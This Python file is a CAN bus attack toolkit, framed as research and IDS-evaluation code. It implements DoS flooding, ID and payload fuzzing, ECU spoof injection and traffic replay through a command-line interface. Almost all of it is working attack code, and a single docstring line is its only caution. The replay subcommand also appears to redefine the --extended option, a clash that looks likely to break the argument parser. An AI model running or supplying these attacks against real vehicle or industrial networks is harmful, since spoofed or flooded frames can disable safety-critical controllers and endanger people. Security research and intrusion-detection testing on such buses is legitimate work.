#!/usr/bin/env python3
"""
CAN Bus Attack Toolkit (for research & IDS evaluation)

Implements common CAN attack profiles using python-can:
- DoS Flood: saturate the bus with high-rate frames
- Fuzzing: random IDs/DLC/data to stress decoders
- Spoof Injection: craft frames mimicking a target ECU
- Replay: play back captured traffic

Usage examples are in the accompanying README.

IMPORTANT: Use only on an isolated testbed with explicit authorization.
"""
import argparse
import csv
import os
import random
import sys
import time
from typing import Optional, Tuple, Iterable

try:
    import can
except ImportError as e:
    print("python-can is required. Install with: pip install python-can", file=sys.stderr)
    raise


class AttackLogger:
    def __init__(self, log_path: Optional[str]):
        self.log_path = log_path
        self.writer = None
        self.file = None
        if log_path:
            os.makedirs(os.path.dirname(log_path), exist_ok=True)
            self.file = open(log_path, mode='w', newline='')
            self.writer = csv.writer(self.file)
            self.writer.writerow(["timestamp", "attack", "id", "is_extended", "dlc", "data_hex", "note"])  # header

    def log(self, attack: str, msg: can.Message, note: str = ""):
        if self.writer:
            ts = time.time()
            data_hex = msg.data.hex().upper()
            self.writer.writerow([f"{ts:.6f}", attack, hex(msg.arbitration_id), bool(msg.is_extended_id), msg.dlc, data_hex, note])

    def close(self):
        if self.file:
            self.file.close()


def build_bus(args: argparse.Namespace) -> can.Bus:
    """Create a python-can Bus according to CLI args."""
    bus_kwargs = {
        "bustype": args.bus_type,
    }
    # Channel & bitrate are adapter-specific; keep flexible
    if args.channel:
        bus_kwargs["channel"] = args.channel
    if args.bitrate:
        bus_kwargs["bitrate"] = args.bitrate
    if args.timing:
        # Some drivers accept timing as dict or str; pass through
        bus_kwargs["timing"] = args.timing
    return can.Bus(**bus_kwargs)


def parse_payload(payload_arg: Optional[str], dlc: int) -> bytes:
    """Parse payload from comma/space-separated hex bytes (e.g., "01,02,FF"). If None, return zeros by dlc."""
    if not payload_arg:
        return bytes([0] * dlc)
    # Allow formats like "01,02,ff" or "01 02 ff"
    parts = [p for p in payload_arg.replace(" ", ",").split(",") if p]
    data = bytearray()
    for p in parts:
        b = int(p, 16)
        if b < 0 or b > 255:
            raise ValueError("Payload byte out of range: %s" % p)
        data.append(b)
    if len(data) != dlc:
        raise ValueError(f"Payload length {len(data)} != dlc {dlc}")
    return bytes(data)


def rand_payload(dlc: int, mode: str, seed: Optional[int]) -> bytes:
    if seed is not None:
        random.seed(seed + dlc)
    if mode == "random":
        return bytes(random.getrandbits(8) for _ in range(dlc))
    elif mode == "incremental":
        return bytes((i % 256) for i in range(dlc))
    elif mode == "zeros":
        return bytes([0] * dlc)
    elif mode == "ones":
        return bytes([0xFF] * dlc)
    else:
        raise ValueError(f"Unknown payload mode: {mode}")


def next_id(id_range: Tuple[int, int], extended: bool, mode: str, seed: Optional[int]) -> int:
    lo, hi = id_range
    if extended:
        max_id = 0x1FFFFFFF
    else:
        max_id = 0x7FF
    if hi > max_id:
        hi = max_id
    if lo < 0:
        lo = 0
    if lo > hi:
        lo, hi = hi, lo
    if seed is not None:
        random.seed(seed + lo + hi)
    if mode == "random":
        return random.randint(lo, hi)
    elif mode == "sequential":
        # Use a generator-like simple state via attribute; not thread-safe but fine for CLI
        if not hasattr(next_id, "_seq_state"):
            next_id._seq_state = lo
        val = next_id._seq_state
        next_id._seq_state = lo if val >= hi else val + 1
        return val
    else:
        raise ValueError(f"Unknown id mode: {mode}")


def rate_controller(rate_pps: Optional[float], period_s: Optional[float]):
    """Yield sleep intervals based on either per-second rate or fixed period."""
    if period_s and period_s > 0:
        while True:
            yield period_s
    elif rate_pps and rate_pps > 0:
        interval = 1.0 / rate_pps
        while True:
            yield interval
    else:
        # No pacing: tight loop
        while True:
            yield 0.0


def send_message(bus: can.Bus, msg: can.Message):
    try:
        bus.send(msg)
    except can.CanError as e:
        # Silently continue for aggressive attacks; print occasionally
        print(f"Send failed: {e}")


def attack_flood(bus: can.Bus, args: argparse.Namespace, logger: AttackLogger):
    """DoS flood: Saturate bus with repeated frames."""
    end_time = time.time() + args.duration if args.duration else None
    dlc = args.dlc
    payload = parse_payload(args.payload, dlc) if args.payload else rand_payload(dlc, args.payload_mode, args.seed)
    rid = args.id if args.id is not None else next_id(args.id_range, args.extended, args.id_mode, args.seed)
    msg = can.Message(arbitration_id=rid, is_extended_id=args.extended, dlc=dlc, data=payload)
    pacer = rate_controller(args.rate, args.period)
    for sleep_s in pacer:
        if end_time and time.time() >= end_time:
            break
        send_message(bus, msg)
        logger.log("flood", msg)
        if sleep_s > 0:
            time.sleep(sleep_s)


def attack_fuzz(bus: can.Bus, args: argparse.Namespace, logger: AttackLogger):
    """Fuzz: Randomize ID/DLC/payload continuously."""
    end_time = time.time() + args.duration if args.duration else None
    pacer = rate_controller(args.rate, args.period)
    while True:
        if end_time and time.time() >= end_time:
            break
        rid = next_id(args.id_range, args.extended, args.id_mode, args.seed)
        dlc = random.randint(args.min_dlc, args.max_dlc)
        payload = rand_payload(dlc, args.payload_mode, args.seed)
        msg = can.Message(arbitration_id=rid, is_extended_id=args.extended, dlc=dlc, data=payload)
        send_message(bus, msg)
        logger.log("fuzz", msg)
        sleep_s = next(pacer)
        if sleep_s > 0:
            time.sleep(sleep_s)


def attack_spoof(bus: can.Bus, args: argparse.Namespace, logger: AttackLogger):
    """Spoof: Craft frames with a target ID and payload, at a set period or rate."""
    end_time = time.time() + args.duration if args.duration else None
    dlc = args.dlc
    payload = parse_payload(args.payload, dlc) if args.payload else rand_payload(dlc, args.payload_mode, args.seed)
    rid = args.id
    if rid is None:
        raise ValueError("Spoof requires --id")
    msg = can.Message(arbitration_id=rid, is_extended_id=args.extended, dlc=dlc, data=payload)
    pacer = rate_controller(args.rate, args.period)
    for sleep_s in pacer:
        if end_time and time.time() >= end_time:
            break
        send_message(bus, msg)
        logger.log("spoof", msg)
        if sleep_s > 0:
            time.sleep(sleep_s)


def parse_candump_line(line: str) -> Optional[Tuple[float, int, bool, bytes]]:
    """Parse a minimal candump log line: (timestamp) can0 123#11223344... or extended IDs with 'can0 1234567#...'
    Returns (timestamp, id, extended, data) or None.
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    # Common format: (1633024800.123456) can0 123#0102030405060708
    try:
        if line[0] == "(":
            ts_end = line.index(")")
            ts = float(line[1:ts_end])
            rest = line[ts_end+1:].strip()
        else:
            ts = time.time()
            rest = line
        parts = rest.split()
        if len(parts) < 2:
            return None
        frame = parts[1]
        if "#" not in frame:
            return None
        id_str, data_hex = frame.split("#", 1)
        rid = int(id_str, 16)
        extended = rid > 0x7FF
        data = bytes.fromhex(data_hex)
        return (ts, rid, extended, data)
    except Exception:
        return None


def attack_replay(bus: can.Bus, args: argparse.Namespace, logger: AttackLogger):
    """Replay: Read a log file and resend frames. Supports candump-like text logs and CSV with id,data_hex."""
    if not args.input:
        raise ValueError("Replay requires --input log file")
    if not os.path.exists(args.input):
        raise FileNotFoundError(args.input)

    def iter_frames() -> Iterable[Tuple[float, int, bool, bytes]]:
        # Try CSV: timestamp,id,is_extended,dlc,data_hex
        if args.input.lower().endswith(".csv"):
            with open(args.input, newline="") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    try:
                        ts = float(row.get("timestamp", time.time()))
                        rid = int(row["id"], 16) if row.get("id", "").startswith("0x") else int(row["id"])
                        extended = row.get("is_extended") in ("True", "true", "1") or rid > 0x7FF
                        data = bytes.fromhex(row["data_hex"]) if row.get("data_hex") else bytes()
                        yield (ts, rid, extended, data)
                    except Exception:
                        continue
        else:
            # Treat as candump text
            with open(args.input, "r") as f:
                for line in f:
                    parsed = parse_candump_line(line)
                    if parsed:
                        yield parsed

    pacer = rate_controller(args.rate, args.period)
    # Respect timing if --preserve_timestamps set, otherwise paced by rate/period
    frames = list(iter_frames())
    if not frames:
        print("No frames parsed from input.")
        return
    start_ts = frames[0][0]

    end_time = time.time() + args.duration if args.duration else None
    idx = 0
    while True:
        if end_time and time.time() >= end_time:
            break
        ts, rid, extended, data = frames[idx]
        msg = can.Message(arbitration_id=rid, is_extended_id=extended if args.extended is None else args.extended, dlc=len(data), data=data)
        send_message(bus, msg)
        logger.log("replay", msg, note=f"src_ts={ts}")
        if args.preserve_timestamps and idx + 1 < len(frames):
            delay = max(0.0, frames[idx + 1][0] - ts)
            time.sleep(delay)
        else:
            sleep_s = next(pacer)
            if sleep_s > 0:
                time.sleep(sleep_s)
        idx += 1
        if idx >= len(frames):
            if args.loop:
                idx = 0
                start_ts = frames[0][0]
            else:
                break


def add_common_args(p: argparse.ArgumentParser):
    p.add_argument("--bus-type", default="socketcan", help="python-can bustype (e.g., socketcan, pcan, kvaser, virtual)")
    p.add_argument("--channel", default="can0", help="Adapter channel (e.g., can0, PCAN_USBBUS1)")
    p.add_argument("--bitrate", type=int, default=None, help="Bitrate in bps (adapter-dependent)")
    p.add_argument("--timing", default=None, help="Adapter-specific timing settings")
    p.add_argument("--extended", action="store_true", help="Use extended 29-bit IDs for generated frames")
    p.add_argument("--duration", type=float, default=None, help="Attack duration in seconds (omit for indefinite)")
    p.add_argument("--rate", type=float, default=None, help="Messages per second (mutually exclusive with --period)")
    p.add_argument("--period", type=float, default=None, help="Fixed period between frames in seconds")
    p.add_argument("--log", default=os.path.join(os.path.dirname(__file__), "logs", "attack_log.csv"), help="CSV log output path")
    p.add_argument("--seed", type=int, default=None, help="Random seed for reproducibility")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="CAN Bus Attack Toolkit (research use only)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest="attack", required=True)

    # Flood (DoS)
    flood = subparsers.add_parser("flood", help="DoS flood: repeat frames as fast as possible or at a rate")
    add_common_args(flood)
    flood.add_argument("--id", type=lambda x: int(x, 0), default=None, help="Arbitration ID to flood (e.g., 0x123). If omitted, generated from --id-range")
    flood.add_argument("--id-range", type=lambda s: tuple(int(p, 0) for p in s.split("-")), default=(0x100, 0x1FF), help="Range for random/sequential IDs (lo-hi)")
    flood.add_argument("--id-mode", choices=["random", "sequential"], default="random", help="ID selection mode when --id is omitted")
    flood.add_argument("--dlc", type=int, default=8, help="Data length code")
    flood.add_argument("--payload", default=None, help="Comma/space-separated hex bytes for payload (length must match dlc)")
    flood.add_argument("--payload-mode", choices=["random", "incremental", "zeros", "ones"], default="random", help="Payload generation mode when --payload is omitted")

    # Fuzz
    fuzz = subparsers.add_parser("fuzz", help="Fuzzing: randomize ID/DLC/payload across a range")
    add_common_args(fuzz)
    fuzz.add_argument("--id-range", type=lambda s: tuple(int(p, 0) for p in s.split("-")), default=(0x000, 0x7FF), help="ID range (lo-hi)")
    fuzz.add_argument("--id-mode", choices=["random", "sequential"], default="random", help="ID selection mode")
    fuzz.add_argument("--min-dlc", type=int, default=0, help="Minimum DLC")
    fuzz.add_argument("--max-dlc", type=int, default=8, help="Maximum DLC")
    fuzz.add_argument("--payload-mode", choices=["random", "incremental", "zeros", "ones"], default="random", help="Payload generation mode")

    # Spoof
    spoof = subparsers.add_parser("spoof", help="Spoof injection: craft frames for a specific ID")
    add_common_args(spoof)
    spoof.add_argument("--id", type=lambda x: int(x, 0), required=True, help="Target arbitration ID (e.g., 0x123)")
    spoof.add_argument("--dlc", type=int, default=8, help="Data length code")
    spoof.add_argument("--payload", default=None, help="Comma/space-separated hex bytes for payload (length must match dlc)")
    spoof.add_argument("--payload-mode", choices=["random", "incremental", "zeros", "ones"], default="random", help="Payload generation mode when --payload is omitted")

    # Replay
    replay = subparsers.add_parser("replay", help="Replay captured traffic from a log file")
    add_common_args(replay)
    replay.add_argument("--input", required=True, help="Input log file (CSV or candump text)")
    replay.add_argument("--loop", action="store_true", help="Loop the replay when end-of-file is reached")
    replay.add_argument("--preserve-timestamps", action="store_true", help="Replay according to source timestamps instead of a fixed period/rate")
    replay.add_argument("--extended", dest="extended", action="store_true", help="Force extended IDs for output (overrides log)")
    replay.add_argument("--no-extended", dest="extended", action="store_false", help="Force standard IDs for output (overrides log)")
    replay.set_defaults(extended=None)

    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    bus = build_bus(args)
    logger = AttackLogger(args.log)
    try:
        if args.attack == "flood":
            attack_flood(bus, args, logger)
        elif args.attack == "fuzz":
            attack_fuzz(bus, args, logger)
        elif args.attack == "spoof":
            attack_spoof(bus, args, logger)
        elif args.attack == "replay":
            attack_replay(bus, args, logger)
        else:
            parser.error("Unknown attack")
    finally:
        logger.close()
        bus.shutdown()


if __name__ == "__main__":
    main()
